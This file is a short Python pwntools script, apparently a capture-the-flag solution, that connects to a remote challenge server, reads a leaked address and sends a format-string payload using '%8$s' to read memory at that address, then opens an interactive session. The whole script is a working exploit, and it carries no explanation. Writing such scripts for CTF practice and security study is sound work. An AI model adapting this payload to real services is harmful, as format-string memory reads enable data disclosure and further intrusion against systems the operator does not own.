from pwn import *
import binascii

# r = process("stdbuf -i0 -o0 remote_files/exe", shell=True)
# r = gdb.debug("remote_files/exe")
r = remote("chall.polygl0ts.ch", 16000)
a = ELF("remote_files/exe")

r.recvuntil("at ")
addr = int(r.recv(10)[2:], 16)
r.sendline(b'AAAA' + p32(addr) + b'\\n%8$s')

print(addr)

r.interactive()
